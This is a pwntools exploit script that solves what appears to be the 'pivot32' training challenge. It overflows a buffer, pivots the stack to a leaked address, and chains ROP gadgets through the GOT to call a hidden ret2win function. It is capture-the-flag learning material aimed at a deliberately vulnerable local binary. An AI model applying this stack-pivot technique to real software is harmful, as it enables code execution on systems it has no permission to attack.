#!/usr/bin/env python3

from pwn import *

pwn = process("./pivot32")
#gdb.attach(pwn, '''
#break main
#''')

#------------------- TOYS ------------------------#
junk = b'A' * 44

pivot_gadget = p32(0x080488c2) # xchg eax, esp; ret;
pop_eax = p32(0x080488c0) # pop eax; ret; 
mov_eax = p32(0x080488c4) # mov eax, [eax]; ret;
add_eax = p32(0x080488c7) # add eax, ebx; ret;
pop_ebx = p32(0x08048571) # pop ebx; ret;
call_eax = p32(0x080486a3) # call eax

foothold = p32(0x080485f0)
foothold_got_plt = p32(0x0804a024)
offset = 0x1f7

ret2win = p32(0x0804a024 + offset)
#------------------- TOYS ------------------------#

pwn.recvuntil(b'pivot: ')
pivot_addr = pwn.recvline().decode().replace("0x","")
pivot_addr = int(pivot_addr,16)
pivot_addr = p32(pivot_addr)

#-----SECOND ROP CHAIN-----#
pivot = foothold
pivot += pop_eax
pivot += foothold_got_plt # this address gets popped into eax
pivot += mov_eax # now eax holds the newly populated address in the GOT
pivot += pop_ebx
pivot += p32(offset)
pivot += add_eax # eax now holds foothold + offset == ret2win
pivot += call_eax
#--------------------------#

#-----FIRST ROP CHAIN-----#
buf = junk
buf += pop_eax
buf += pivot_addr
buf += pivot_gadget
#------------------------_#

pwn.sendline(pivot)
pwn.sendline(buf)
pwn.interactive()
